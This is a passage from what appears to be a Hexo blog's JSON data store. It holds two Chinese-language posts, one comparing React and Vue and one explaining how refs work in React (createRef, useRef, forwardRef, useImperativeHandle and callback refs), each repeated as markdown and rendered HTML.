特别多的时候，Watcher 也会很多，会导致卡顿，所以大型应用（状态特别多的）一般用 React，更加可控。\n* 通过 js 来操作一切，还是用各自的处理方式: \n  * React 的思路是all in js，通过js来生成html，所以设计了jsx，还有通过js来操作css，社区的 styled-component、jss等; \n  * Vue 是把html，css，js组合到一起，用各自的处理方式，Vue有单文件组件，可以把html、css、js写到一个文件中，html提供了模板引擎来处理。\n* 类式的组件写法，还是声明式的写法: \n  * React是类式的写法，api 很少; \n  * Vue 是声明式的写法，通过传入各种 options，api 和参数都很多。\n  * 所以 React 结合 typescript 更容易一起写，Vue 稍微复杂。\n* 扩展不同: \n  * React 可以通过高阶组件（Higher Order Components--HOC）来扩展，\n  * Vue 需要通过 mixins 来扩展。\n* 功能内置: \n  * React做的事情很少，很多都交给社区去做\n  * Vue很多东西都是内置的，写起来确实方便一些","source":"_posts/React/React 和 Vue 的区别.md","raw":"---\ntitle: React 和 Vue 的区别\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# React 和 Vue 的区别\n\n* 数据是否可变\n  * React 整体是函数式的思想，把组件设计成纯组件，状态和逻辑通过参数传入，所以在 React中，是单向数据流，推崇结合 immutable 来实现数据不可变\n  * Vue 的思想是响应式的，也就是基于是数据可变的，通过对每一个属性建立 Watcher 来监听，当属性变化的时候，响应式的更新对应的虚拟dom。\n  * 总之，React 的性能优化需要手动去做，而 Vue 的性能优化是自动的，但是Vue的响应式机制也有问题，就是当 state 特别多的时候，Watcher 也会很多，会导致卡顿，所以大型应用（状态特别多的）一般用 React，更加可控。\n* 通过 js 来操作一切，还是用各自的处理方式: \n  * React 的思路是all in js，通过js来生成html，所以设计了jsx，还有通过js来操作css，社区的 styled-component、jss等; \n  * Vue 是把html，css，js组合到一起，用各自的处理方式，Vue有单文件组件，可以把html、css、js写到一个文件中，html提供了模板引擎来处理。\n* 类式的组件写法，还是声明式的写法: \n  * React是类式的写法，api 很少; \n  * Vue 是声明式的写法，通过传入各种 options，api 和参数都很多。\n  * 所以 React 结合 typescript 更容易一起写，Vue 稍微复杂。\n* 扩展不同: \n  * React 可以通过高阶组件（Higher Order Components--HOC）来扩展，\n  * Vue 需要通过 mixins 来扩展。\n* 功能内置: \n  * React做的事情很少，很多都交给社区去做\n  * Vue很多东西都是内置的，写起来确实方便一些","slug":"React/React 和 Vue 的区别","published":1,"updated":"2021-06-07T11:49:34.740Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu2k0004df6rfkoc44x3","content":"<h1 id=\"React-和-Vue-的区别\"><a href=\"#React-和-Vue-的区别\" class=\"headerlink\" title=\"React 和 Vue 的区别\"></a>React 和 Vue 的区别</h1><ul>\n<li>数据是否可变<ul>\n<li>React 整体是函数式的思想，把组件设计成纯组件，状态和逻辑通过参数传入，所以在 React中，是单向数据流，推崇结合 immutable 来实现数据不可变</li>\n<li>Vue 的思想是响应式的，也就是基于是数据可变的，通过对每一个属性建立 Watcher 来监听，当属性变化的时候，响应式的更新对应的虚拟dom。</li>\n<li>总之，React 的性能优化需要手动去做，而 Vue 的性能优化是自动的，但是Vue的响应式机制也有问题，就是当 state 特别多的时候，Watcher 也会很多，会导致卡顿，所以大型应用（状态特别多的）一般用 React，更加可控。</li>\n</ul>\n</li>\n<li>通过 js 来操作一切，还是用各自的处理方式: <ul>\n<li>React 的思路是all in js，通过js来生成html，所以设计了jsx，还有通过js来操作css，社区的 styled-component、jss等; </li>\n<li>Vue 是把html，css，js组合到一起，用各自的处理方式，Vue有单文件组件，可以把html、css、js写到一个文件中，html提供了模板引擎来处理。</li>\n</ul>\n</li>\n<li>类式的组件写法，还是声明式的写法: <ul>\n<li>React是类式的写法，api 很少; </li>\n<li>Vue 是声明式的写法，通过传入各种 options，api 和参数都很多。</li>\n<li>所以 React 结合 typescript 更容易一起写，Vue 稍微复杂。</li>\n</ul>\n</li>\n<li>扩展不同: <ul>\n<li>React 可以通过高阶组件（Higher Order Components–HOC）来扩展，</li>\n<li>Vue 需要通过 mixins 来扩展。</li>\n</ul>\n</li>\n<li>功能内置: <ul>\n<li>React做的事情很少，很多都交给社区去做</li>\n<li>Vue很多东西都是内置的，写起来确实方便一些</li>\n</ul>\n</li>\n</ul>\n","site":{"data":{}},"excerpt":"","more":"<h1 id=\"React-和-Vue-的区别\"><a href=\"#React-和-Vue-的区别\" class=\"headerlink\" title=\"React 和 Vue 的区别\"></a>React 和 Vue 的区别</h1><ul>\n<li>数据是否可变<ul>\n<li>React 整体是函数式的思想，把组件设计成纯组件，状态和逻辑通过参数传入，所以在 React中，是单向数据流，推崇结合 immutable 来实现数据不可变</li>\n<li>Vue 的思想是响应式的，也就是基于是数据可变的，通过对每一个属性建立 Watcher 来监听，当属性变化的时候，响应式的更新对应的虚拟dom。</li>\n<li>总之，React 的性能优化需要手动去做，而 Vue 的性能优化是自动的，但是Vue的响应式机制也有问题，就是当 state 特别多的时候，Watcher 也会很多，会导致卡顿，所以大型应用（状态特别多的）一般用 React，更加可控。</li>\n</ul>\n</li>\n<li>通过 js 来操作一切，还是用各自的处理方式: <ul>\n<li>React 的思路是all in js，通过js来生成html，所以设计了jsx，还有通过js来操作css，社区的 styled-component、jss等; </li>\n<li>Vue 是把html，css，js组合到一起，用各自的处理方式，Vue有单文件组件，可以把html、css、js写到一个文件中，html提供了模板引擎来处理。</li>\n</ul>\n</li>\n<li>类式的组件写法，还是声明式的写法: <ul>\n<li>React是类式的写法，api 很少; </li>\n<li>Vue 是声明式的写法，通过传入各种 options，api 和参数都很多。</li>\n<li>所以 React 结合 typescript 更容易一起写，Vue 稍微复杂。</li>\n</ul>\n</li>\n<li>扩展不同: <ul>\n<li>React 可以通过高阶组件（Higher Order Components–HOC）来扩展，</li>\n<li>Vue 需要通过 mixins 来扩展。</li>\n</ul>\n</li>\n<li>功能内置: <ul>\n<li>React做的事情很少，很多都交给社区去做</li>\n<li>Vue很多东西都是内置的，写起来确实方便一些</li>\n</ul>\n</li>\n</ul>\n"},{"title":"React 中 ref 的使用","date":"2021-05-26T08:32:38.000Z","_content":"\n# React 中 ref 的使用\n\n**`ref` 与 `Refs` 是两个不同的概念**\n* `ref` 是一个特殊的属性，可作用于 `DOM 元素`或 `React 元素`上，用于接收 HTML 元素或组件实例，作为其 current 属性\n* `Refs` 是 React 提供的可用特定 API 创建的一个对象，可以用 `React.creatRef()` 、`React.useRef()` 创建，生成的对象类似于 `{ current: null }`，用于赋值给 `DOM 元素` 或 `React 元素` 上\n\n**适合使用 refs 的几种情况**\n* 管理焦点，文本选择或媒体播放\n* 触发强制动画\n* 集成第三方 DOM 库\n\n> React 为提供了直接访问 *DOM元素* 和 *React 元素*的方式，就是通过 Refs。使用的方式很简单，就是为想要访问的元素上添加 `ref` 属性，将 `Refs` 对象附加到 `ref` 属性上，那么此时 `Refs` 对象的 `current` 属性就不再是空，而是对应的 *DOM元素* 或 *React 元素实例*\n\n**React.createRef()**\n使用 `React.createRef()` 的方式可以创建一个 *Ref 对象*，可通过附加到 ref 属性上访问一个 *原生DOM元素* 或者 *class 组件*。这种方式可以在*函数组件*和*class 组件*中使用。\n\n**React.useRef(initialValue)**\n`React.useRef()` 返回一个可变的 *Ref 对象*，其 `.current` 属性被初始化为传入的参数 `initialValue`。返回的 `Refs` 对象在组件的整个生命周期内保持不变。这种方式只能在**函数组件**中使用。\n\n> ref 属性只能被添加到原生 DOM元素 或者 React的 class 组件上。不能在直接函数组件 上使用 ref 属性，因为函数组件没有实例。若想在函数组件上使用 ref 属性，可以通过 React.forwardRef 将 Ref 转发到函数组件内部\n\n当 ref 属性接收 Ref 对象时，会将其对应的 DOM元素 或者 class组件实例 直接赋值给 Ref 对象中的 current 属性上。而当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class组件实例作为回调函数的参数调用回调函数。\n\n### 1. React.createRef()\n\n`React.createRef` 主要用在 class 组件中，用于创建 Refs 对象，用来保存和引用一些值，并且修改这个属性不会触发组件更新。\n\n```js\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.myRef = React.createRef();\n  }\n  componentDidMount() {\n    this.myRef.current.focus();\n  }\n  render() {\n    return <input ref={this.myRef} />;\n  }\n}\n```\n\n### 2. React.useRef()\n\n`React.useRef()` 作为 react hooks 的一种，主要用在函数组件中。\n\n`React.useRef()` 返回一个可变的 *Ref 对象*，其 `.current` 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的**整个生命周期内保持不变**，所以可用于保存 **React 组件**、**DOM 元素**或**普通 js 对象**的值\n\n默认情况下，不能在函数组件上使用 ref 属性，因为函数组件没有示例，所以以下代码不能正常运行\n\n> 函数组件中 state 变化时，会重新创建、初始化所有的变量和表达式，故不能使用 `React.createRef()`\n\n```js\n// 不能正常运行\nfunction MyFunctionComponent() {\n  return <input />;\n}\n\nclass Parent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.textInput = React.createRef();\n  }\n  render() {\n    return (\n      <MyFunctionComponent ref={this.textInput} />\n    );\n  }\n}\n```\n\n如果要在函数组件中使用 ref，可以使用 React.forwardRef（可与 useImperativeHandle 结合使用）\n\n```js\n// 可以正常运行\nfunction MyFunctionComponent(props, ref) {\n  React.useImperativeHandle(ref, () => ({\n    onCheck,\n  }));\n\n  const onCheck = () => {};\n\n  return <input />;\n}\n\nconst NewMyFunctionComponent = React.forwardRef(MyFunctionComponent)\n\nclass Parent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.textInput = React.createRef();\n  }\n  render() {\n    return (\n      <MyFunctionComponent ref={this.textInput} />\n    );\n  }\n}\n```\n\n总之，在函数组件内部使用 ref 属性，只能指向一个 DOM 元素或 class 组件\n\n```js\nfunction CustomTextInput(props) {\n  // 这里必须声明 textInput，这样 ref 才可以引用它\n  const textInput = useRef(null);\n\n  function handleClick() {\n    textInput.current.focus();\n  }\n\n  return (\n    <div>\n      <input\n        type=\"text\"\n        ref={textInput} />\n      <input\n        type=\"button\"\n        value=\"Focus the text input\"\n        onClick={handleClick}\n      />\n    </div>\n  );\n}\n```\n\n\n\n### 3. React.forwardRef()\n\n`React.forwardRef` 主要用于穿过父元素直接获取子元素的 ref。HOC（higher-order component）在 ref 使用上会存在问题，HOC 的 ref 是无法通过 props 进行传递的，因此无法直接获取被包裹组件（WrappedComponent），所以需要进行中转。\n\n```js\nfunction HOCProps(WrappedComponent) {\n  class HOCComponent extends React.Component {\n    constructor(props) {\n      super(props);\n      this.setWrappedInstance = this.setWrappedInstance.bind(this);\n    }\n    \n    getWrappedInstance() {\n      return this.wrappedInstance;\n    }\n\n    // 实现 ref 的访问\n    setWrappedInstance(ref) {\n      this.wrappedInstance = ref;\n    }\n    \n    render() {\n      return <WrappedComponent ref={this.setWrappedInstance} {...this.props} />;\n    }\n  }\n\n  return HOCComponent;\n}\n\nconst App = HOCProps(Wrap);\n\n<App ref={(dom) => {\n  console.log(dom); // 只能获取到 HOCComponent\n  console.log(dom.getWrappedInstance()); // 通过中转后可以获取到 WrappedComponent\n}} />\n```\n\n利用 forwardRef 能直接穿透 HOCComponent 获取到 WrappedComponent\n\n> React.forwardRef 的原理其实非常简单，forwardRef 会生成 react 内部一种较为特殊的 Component。当进行创建更新操作时，会将 forwardRef 组件上的 props 与 ref 直接传递给提前注入的 render 函数，来生成 children。\n\n```js\nfunction HOCProps(WrappedComponent) {\n  class HOCComponent extends React.Component {\n    render() {\n      const { forwardedRef, ...rest } = this.props;\n      return <WrappedComponent ref={forwardedRef} {...rest} />;\n    }\n  }\n\n  return React.forwardRef((props, ref) => {\n    return <HOCComponent forwardedRef={ref} {...props}  />;\n  });\n}\n\nconst App = HOCProps(Wrap);\n\n<App ref={(dom) => {\n  // 可以直接获取 WrappedComponent\n  console.log(dom);\n}} />\n\n```\n\n### 4. React.useImperativeHandle()\n\n`useImperativeHandle(ref, createHandle, [deps])`\n\n`useImperativeHandle` 可以让你在使用 `ref` 时自定义暴露给父组件的实例值。`useImperativeHandle` 应当与 `forwardRef` 一起使用.\n\n```js\nfunction FancyInput(props, ref) {\n  const inputRef = useRef();\n\n  useImperativeHandle(ref, () => ({\n    focus: () => {\n      inputRef.current.focus();\n    }\n  }));\n\n  return <input ref={inputRef} />;\n}\nFancyInput = forwardRef(FancyInput);\n```\n\n在本例中，渲染 `<FancyInput ref={inputRef} />` 的父组件可以调用 `inputRef.current.focus()`。\n\n\n### 5. callback ref\n\n当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class 组件实例作为回调函数的参数调用回调函数。因此我们可以通过回调 Refs 的方式不依靠 Ref 对象，更灵活地控制要访问的元素或实例\n\n> callback ref 采用了组件 render 过程中在闭包函数中分配 ref 的模式，通常会使用内联函数的形式，那么每次渲染都会重新创建，由于 react 会清理旧的 ref 然后设置新的，因此更新期间会调用两次，第一次为 null，如果在 callback 中带有业务逻辑的话，可能会出错，当然可以通过将 callback 定义成类成员函数并进行绑定的方式避免。\n\n\n```js\nclass MyComponent extends React.Component {\n  componentDidMount() {\n    this.myRef.focus();\n  }\n  render() {\n    return <input ref={(ele) => {\n      this.myRef = ele;\n    }} />;\n  }\n}\n```\n\n### 6. string ref (不再建议使用)\n\nReact 官方文档直接提出 `string ref` 将会在未来版本被移出，建议用户使用 `callback ref` 来代替\n\n```js\n// string ref\nclass MyComponent extends React.Component {\n  componentDidMount() {\n    this.refs.myRef.focus();\n  }\n  render() {\n    return <input ref=\"myRef\" />;\n  }\n}\n```\n\n`string ref` 存在以下问题：\n1. 存在性能问题：当 ref 定义为 string 时，需要 React 追踪当前正在渲染的组件，在 reconciliation 阶段，React Element 创建和更新的过程中，ref 会被封装为一个闭包函数，等待 commit 阶段被执行，这会对 React 的性能产生一些影响。\n2. 使用 string ref 会造成 ref 挂载位置产生歧义\n3. string ref 无法被组合，例如一个第三方库的父组件已经给子组件传递了 ref，那么我们就无法再在子组件上添加 ref 了，而 callback ref 可完美解决此问题\n4. 在根组件上使用无法生效\n5. 对于静态类型较不友好，当使用 string ref 时，必须显式声明 refs 的类型，无法完成自动推导。\n6. 编译器无法将 string ref 与其 refs 上对应的属性进行混淆，而使用 callback ref，可被混淆。\n\n\n### 7. 总结\n\n在 class 内部通过 `React.createRef()` 创建 Refs 对象，在函数组件内部通过 `React.useRef()` 创建 Refs 对象，如果被引用的组件为函数组件，则需要通过 `React.forwardRef()` 和 `React.useImperativeHandler()` 来作处理。\n\n* 父组件为 class 组件，子组件为 class 组件 ---- 父组件中直接使用 `React.createRef()` 引用子组件实例\n* 父组件为 class 组件，子组件为 函数组件 ---- 父组件中 `React.createRef()`，子组件使用 `React.forwardRef()` 和 `React.useImperativeHandler()`\n* 父组件为 函数组件，子组件为 class 组件 ---- 父组件中直接使用 `React.useRef()` 引用子组件实例\n* 父组件为 函数组件，子组件为 函数组件 ---- 父组件中 `React.useRef()`，子组件使用 `React.forwardRef()` 和 `React.useImperativeHandler()`\n","source":"_posts/React/React 中 ref 的使用.md","raw":"---\ntitle: React 中 ref 的使用\ncategories: React\ntags: [React]\ndate: 2021-05-26 16:32:38\n---\n\n# React 中 ref 的使用\n\n**`ref` 与 `Refs` 是两个不同的概念**\n* `ref` 是一个特殊的属性，可作用于 `DOM 元素`或 `React 元素`上，用于接收 HTML 元素或组件实例，作为其 current 属性\n* `Refs` 是 React 提供的可用特定 API 创建的一个对象，可以用 `React.creatRef()` 、`React.useRef()` 创建，生成的对象类似于 `{ current: null }`，用于赋值给 `DOM 元素` 或 `React 元素` 上\n\n**适合使用 refs 的几种情况**\n* 管理焦点，文本选择或媒体播放\n* 触发强制动画\n* 集成第三方 DOM 库\n\n> React 为提供了直接访问 *DOM元素* 和 *React 元素*的方式，就是通过 Refs。使用的方式很简单，就是为想要访问的元素上添加 `ref` 属性，将 `Refs` 对象附加到 `ref` 属性上，那么此时 `Refs` 对象的 `current` 属性就不再是空，而是对应的 *DOM元素* 或 *React 元素实例*\n\n**React.createRef()**\n使用 `React.createRef()` 的方式可以创建一个 *Ref 对象*，可通过附加到 ref 属性上访问一个 *原生DOM元素* 或者 *class 组件*。这种方式可以在*函数组件*和*class 组件*中使用。\n\n**React.useRef(initialValue)**\n`React.useRef()` 返回一个可变的 *Ref 对象*，其 `.current` 属性被初始化为传入的参数 `initialValue`。返回的 `Refs` 对象在组件的整个生命周期内保持不变。这种方式只能在**函数组件**中使用。\n\n> ref 属性只能被添加到原生 DOM元素 或者 React的 class 组件上。不能在直接函数组件 上使用 ref 属性，因为函数组件没有实例。若想在函数组件上使用 ref 属性，可以通过 React.forwardRef 将 Ref 转发到函数组件内部\n\n当 ref 属性接收 Ref 对象时，会将其对应的 DOM元素 或者 class组件实例 直接赋值给 Ref 对象中的 current 属性上。而当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class组件实例作为回调函数的参数调用回调函数。\n\n### 1. React.createRef()\n\n`React.createRef` 主要用在 class 组件中，用于创建 Refs 对象，用来保存和引用一些值，并且修改这个属性不会触发组件更新。\n\n```js\nclass MyComponent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.myRef = React.createRef();\n  }\n  componentDidMount() {\n    this.myRef.current.focus();\n  }\n  render() {\n    return <input ref={this.myRef} />;\n  }\n}\n```\n\n### 2. React.useRef()\n\n`React.useRef()` 作为 react hooks 的一种，主要用在函数组件中。\n\n`React.useRef()` 返回一个可变的 *Ref 对象*，其 `.current` 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的**整个生命周期内保持不变**，所以可用于保存 **React 组件**、**DOM 元素**或**普通 js 对象**的值\n\n默认情况下，不能在函数组件上使用 ref 属性，因为函数组件没有示例，所以以下代码不能正常运行\n\n> 函数组件中 state 变化时，会重新创建、初始化所有的变量和表达式，故不能使用 `React.createRef()`\n\n```js\n// 不能正常运行\nfunction MyFunctionComponent() {\n  return <input />;\n}\n\nclass Parent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.textInput = React.createRef();\n  }\n  render() {\n    return (\n      <MyFunctionComponent ref={this.textInput} />\n    );\n  }\n}\n```\n\n如果要在函数组件中使用 ref，可以使用 React.forwardRef（可与 useImperativeHandle 结合使用）\n\n```js\n// 可以正常运行\nfunction MyFunctionComponent(props, ref) {\n  React.useImperativeHandle(ref, () => ({\n    onCheck,\n  }));\n\n  const onCheck = () => {};\n\n  return <input />;\n}\n\nconst NewMyFunctionComponent = React.forwardRef(MyFunctionComponent)\n\nclass Parent extends React.Component {\n  constructor(props) {\n    super(props);\n    this.textInput = React.createRef();\n  }\n  render() {\n    return (\n      <MyFunctionComponent ref={this.textInput} />\n    );\n  }\n}\n```\n\n总之，在函数组件内部使用 ref 属性，只能指向一个 DOM 元素或 class 组件\n\n```js\nfunction CustomTextInput(props) {\n  // 这里必须声明 textInput，这样 ref 才可以引用它\n  const textInput = useRef(null);\n\n  function handleClick() {\n    textInput.current.focus();\n  }\n\n  return (\n    <div>\n      <input\n        type=\"text\"\n        ref={textInput} />\n      <input\n        type=\"button\"\n        value=\"Focus the text input\"\n        onClick={handleClick}\n      />\n    </div>\n  );\n}\n```\n\n\n\n### 3. React.forwardRef()\n\n`React.forwardRef` 主要用于穿过父元素直接获取子元素的 ref。HOC（higher-order component）在 ref 使用上会存在问题，HOC 的 ref 是无法通过 props 进行传递的，因此无法直接获取被包裹组件（WrappedComponent），所以需要进行中转。\n\n```js\nfunction HOCProps(WrappedComponent) {\n  class HOCComponent extends React.Component {\n    constructor(props) {\n      super(props);\n      this.setWrappedInstance = this.setWrappedInstance.bind(this);\n    }\n    \n    getWrappedInstance() {\n      return this.wrappedInstance;\n    }\n\n    // 实现 ref 的访问\n    setWrappedInstance(ref) {\n      this.wrappedInstance = ref;\n    }\n    \n    render() {\n      return <WrappedComponent ref={this.setWrappedInstance} {...this.props} />;\n    }\n  }\n\n  return HOCComponent;\n}\n\nconst App = HOCProps(Wrap);\n\n<App ref={(dom) => {\n  console.log(dom); // 只能获取到 HOCComponent\n  console.log(dom.getWrappedInstance()); // 通过中转后可以获取到 WrappedComponent\n}} />\n```\n\n利用 forwardRef 能直接穿透 HOCComponent 获取到 WrappedComponent\n\n> React.forwardRef 的原理其实非常简单，forwardRef 会生成 react 内部一种较为特殊的 Component。当进行创建更新操作时，会将 forwardRef 组件上的 props 与 ref 直接传递给提前注入的 render 函数，来生成 children。\n\n```js\nfunction HOCProps(WrappedComponent) {\n  class HOCComponent extends React.Component {\n    render() {\n      const { forwardedRef, ...rest } = this.props;\n      return <WrappedComponent ref={forwardedRef} {...rest} />;\n    }\n  }\n\n  return React.forwardRef((props, ref) => {\n    return <HOCComponent forwardedRef={ref} {...props}  />;\n  });\n}\n\nconst App = HOCProps(Wrap);\n\n<App ref={(dom) => {\n  // 可以直接获取 WrappedComponent\n  console.log(dom);\n}} />\n\n```\n\n### 4. React.useImperativeHandle()\n\n`useImperativeHandle(ref, createHandle, [deps])`\n\n`useImperativeHandle` 可以让你在使用 `ref` 时自定义暴露给父组件的实例值。`useImperativeHandle` 应当与 `forwardRef` 一起使用.\n\n```js\nfunction FancyInput(props, ref) {\n  const inputRef = useRef();\n\n  useImperativeHandle(ref, () => ({\n    focus: () => {\n      inputRef.current.focus();\n    }\n  }));\n\n  return <input ref={inputRef} />;\n}\nFancyInput = forwardRef(FancyInput);\n```\n\n在本例中，渲染 `<FancyInput ref={inputRef} />` 的父组件可以调用 `inputRef.current.focus()`。\n\n\n### 5. callback ref\n\n当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class 组件实例作为回调函数的参数调用回调函数。因此我们可以通过回调 Refs 的方式不依靠 Ref 对象，更灵活地控制要访问的元素或实例\n\n> callback ref 采用了组件 render 过程中在闭包函数中分配 ref 的模式，通常会使用内联函数的形式，那么每次渲染都会重新创建，由于 react 会清理旧的 ref 然后设置新的，因此更新期间会调用两次，第一次为 null，如果在 callback 中带有业务逻辑的话，可能会出错，当然可以通过将 callback 定义成类成员函数并进行绑定的方式避免。\n\n\n```js\nclass MyComponent extends React.Component {\n  componentDidMount() {\n    this.myRef.focus();\n  }\n  render() {\n    return <input ref={(ele) => {\n      this.myRef = ele;\n    }} />;\n  }\n}\n```\n\n### 6. string ref (不再建议使用)\n\nReact 官方文档直接提出 `string ref` 将会在未来版本被移出，建议用户使用 `callback ref` 来代替\n\n```js\n// string ref\nclass MyComponent extends React.Component {\n  componentDidMount() {\n    this.refs.myRef.focus();\n  }\n  render() {\n    return <input ref=\"myRef\" />;\n  }\n}\n```\n\n`string ref` 存在以下问题：\n1. 存在性能问题：当 ref 定义为 string 时，需要 React 追踪当前正在渲染的组件，在 reconciliation 阶段，React Element 创建和更新的过程中，ref 会被封装为一个闭包函数，等待 commit 阶段被执行，这会对 React 的性能产生一些影响。\n2. 使用 string ref 会造成 ref 挂载位置产生歧义\n3. string ref 无法被组合，例如一个第三方库的父组件已经给子组件传递了 ref，那么我们就无法再在子组件上添加 ref 了，而 callback ref 可完美解决此问题\n4. 在根组件上使用无法生效\n5. 对于静态类型较不友好，当使用 string ref 时，必须显式声明 refs 的类型，无法完成自动推导。\n6. 编译器无法将 string ref 与其 refs 上对应的属性进行混淆，而使用 callback ref，可被混淆。\n\n\n### 7. 总结\n\n在 class 内部通过 `React.createRef()` 创建 Refs 对象，在函数组件内部通过 `React.useRef()` 创建 Refs 对象，如果被引用的组件为函数组件，则需要通过 `React.forwardRef()` 和 `React.useImperativeHandler()` 来作处理。\n\n* 父组件为 class 组件，子组件为 class 组件 ---- 父组件中直接使用 `React.createRef()` 引用子组件实例\n* 父组件为 class 组件，子组件为 函数组件 ---- 父组件中 `React.createRef()`，子组件使用 `React.forwardRef()` 和 `React.useImperativeHandler()`\n* 父组件为 函数组件，子组件为 class 组件 ---- 父组件中直接使用 `React.useRef()` 引用子组件实例\n* 父组件为 函数组件，子组件为 函数组件 ---- 父组件中 `React.useRef()`，子组件使用 `React.forwardRef()` 和 `React.useImperativeHandler()`\n","slug":"React/React 中 ref 的使用","published":1,"updated":"2021-06-07T11:47:36.201Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckpmjxu2l0005df6r21ymhd9b","content":"<h1 id=\"React-中-ref-的使用\"><a href=\"#React-中-ref-的使用\" class=\"headerlink\" title=\"React 中 ref 的使用\"></a>React 中 ref 的使用</h1><p><strong><code>ref</code> 与 <code>Refs</code> 是两个不同的概念</strong></p>\n<ul>\n<li><code>ref</code> 是一个特殊的属性，可作用于 <code>DOM 元素</code>或 <code>React 元素</code>上，用于接收 HTML 元素或组件实例，作为其 current 属性</li>\n<li><code>Refs</code> 是 React 提供的可用特定 API 创建的一个对象，可以用 <code>React.creatRef()</code> 、<code>React.useRef()</code> 创建，生成的对象类似于 <code>&#123; current: null &#125;</code>，用于赋值给 <code>DOM 元素</code> 或 <code>React 元素</code> 上</li>\n</ul>\n<p><strong>适合使用 refs 的几种情况</strong></p>\n<ul>\n<li>管理焦点，文本选择或媒体播放</li>\n<li>触发强制动画</li>\n<li>集成第三方 DOM 库</li>\n</ul>\n<blockquote>\n<p>React 为提供了直接访问 <em>DOM元素</em> 和 <em>React 元素</em>的方式，就是通过 Refs。使用的方式很简单，就是为想要访问的元素上添加 <code>ref</code> 属性，将 <code>Refs</code> 对象附加到 <code>ref</code> 属性上，那么此时 <code>Refs</code> 对象的 <code>current</code> 属性就不再是空，而是对应的 <em>DOM元素</em> 或 <em>React 元素实例</em></p>\n</blockquote>\n<p><strong>React.createRef()</strong><br>使用 <code>React.createRef()</code> 的方式可以创建一个 <em>Ref 对象</em>，可通过附加到 ref 属性上访问一个 <em>原生DOM元素</em> 或者 <em>class 组件</em>。这种方式可以在<em>函数组件</em>和<em>class 组件</em>中使用。</p>\n<p><strong>React.useRef(initialValue)</strong><br><code>React.useRef()</code> 返回一个可变的 <em>Ref 对象</em>，其 <code>.current</code> 属性被初始化为传入的参数 <code>initialValue</code>。返回的 <code>Refs</code> 对象在组件的整个生命周期内保持不变。这种方式只能在<strong>函数组件</strong>中使用。</p>\n<blockquote>\n<p>ref 属性只能被添加到原生 DOM元素 或者 React的 class 组件上。不能在直接函数组件 上使用 ref 属性，因为函数组件没有实例。若想在函数组件上使用 ref 属性，可以通过 React.forwardRef 将 Ref 转发到函数组件内部</p>\n</blockquote>\n<p>当 ref 属性接收 Ref 对象时，会将其对应的 DOM元素 或者 class组件实例 直接赋值给 Ref 对象中的 current 属性上。而当 ref 属性接收一个回调函数时，会将其对应的 DOM元素 或 class组件实例作为回调函数的参数调用回调函数。</p>\n<h3 id=\"1-React-createRef\"><a href=\"#1-React-createRef\" class=\"headerlink\" title=\"1. React.createRef()\"></a>1. React.createRef()</h3><p><code>React.createRef</code> 主要用在 class 组件中，用于创建 Refs 对象，用来保存和引用一些值，并且修改这个属性不会触发组件更新。</p>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">MyComponent</span> <span class=\"keyword\">extends</span> <span class=\"title\">React</span>.<span class=\"title\">Component</span> </span>&#123;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">constructor</span>(<span class=\"params\">props</span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">super</span>(props);</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef = React.createRef();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">componentDidMount</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.myRef.current.focus();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  <span class=\"function\"><span class=\"title\">render</span>(<span class=\"params\"></span>)</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"xml\"><span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">ref</span>=<span class=\"string\">&#123;this.myRef&#125;</span> /&gt;</span></span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"2-React-useRef\"><a href=\"#2-React-useRef\" class=\"headerlink\" title=\"2. React.useRef()\"></a>2. React.useRef()</h3><p><code>React.useRef()</code> 作为 react hooks 的一种，主要用在函数组件中。</p>\n<p><code>React.useRef()</code> 返回一个可变的 <em>Ref 对象</em>，其 <code>.current</code> 属性被初始化为传入的参数（initialValue）。返回的 ref 对象在组件的<strong>整个生命周期内保持不变</strong>，所以可用于保存 <strong>React 组件</strong>、<strong>DOM 元素</strong>或<strong>普通 js 对象</strong>的值</p>\n<p>默认情况下，不能在函数组件上使用 ref 属性，因为函数组件没有示例，所以以下代码不能正常运行</p>\n<blockquote>\n<p>函数组件中 state 变化时，会重新创建、初始化所有的变量和表达式，故不能使用 <code>React.createRef()</code></p>\n</blockquote>\n<figure class=\"highlight js\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 